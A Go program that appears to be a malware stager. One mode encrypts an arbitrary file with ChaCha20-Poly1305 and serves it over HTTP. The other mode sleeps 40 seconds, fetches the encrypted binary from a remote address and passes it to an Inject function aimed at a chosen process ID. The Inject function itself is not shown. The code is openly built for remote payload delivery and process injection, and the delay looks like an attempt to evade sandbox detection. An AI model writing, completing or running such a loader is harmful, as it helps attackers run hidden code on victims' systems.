package main

import (
	"crypto/rand"
	"encoding/hex"
	"flag"
	"log"
	"net/http"
	"os"
	"time"

	"vendor/golang.org/x/crypto/chacha20poly1305"

	"golang.org/x/crypto/blake2b"
)

func RandomString(length int) (string, error) {
	randomData := make([]byte, length)
	_, err := rand.Read(randomData)
	if err != nil {
		return "", err
	}

	return hex.EncodeToString(randomData), nil
}

func main() {

	listenAddr := flag.String("listen", ":8081", "webserver listen address")
	filepath := flag.String("serve", "", "File to serve as encrypted payload")

	password := flag.String("pass", "", "Password to encrypt/decrypt payload")

	addr := flag.String("addr", "", "url to encrypted binary")
	pid := flag.Int("pid", os.Getpid(), "pID of process to inject into (defaults to self)")

	flag.Parse()

	var (
		hasFile  bool
		isServer bool
		isClient bool
		hasPid   bool
		err      error
	)

	flag.Visit(func(f *flag.Flag) {
		switch f.Name {
		case "serve":
			hasFile = true
		case "listen":
			isServer = true

		case "addr":
			isClient = true
		case "pid":
			hasPid = true
		}
	})

	if isServer {
		if isClient || hasPid {
			log.Fatal("cannot be client and server at the same time (-addr and -pid are not compatiable with -listen)")
		}

		if *password == "" {
			*password, err = RandomString(16)
			if err != nil {
				log.Fatal("could not generate password: ", err)
			}
			log.Println("no password selected generated one: ", password)
		}

		if !hasFile {
			log.Fatal("no file sepcified ")
		}

		kd := blake2b.Sum256([]byte(*password))

		log.Println("listening on: ", *listenAddr)

		contents, err := os.ReadFile(*filepath)
		if err != nil {
			log.Fatal(err)
		}

		c, err := chacha20poly1305.New(kd[:])
		if err != nil {
			log.Fatal("chacha broken:", err)
		}

		nonce := make([]byte, c.NonceSize(), c.NonceSize()+len(contents)+c.Overhead())
		if _, err := rand.Read(nonce); err != nil {
			log.Fatal("nonce generate broken:", err)
		}

		cipherText := c.Seal(nonce, nonce, contents, nil)

		http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
			w.Write(cipherText)
		})

		log.Fatal(http.ListenAndServe(*listenAddr, nil))

		return
	}

	if *addr == "" {
		log.Fatal("no address specified")
	}

	log.Println("doing 40 second sleep....")

	<-time.After(40 * time.Second)

	log.Println("Starting load...")

	log.Println(Inject(*pid, *addr, *password))

	time.Sleep(100 * time.Minute)
}
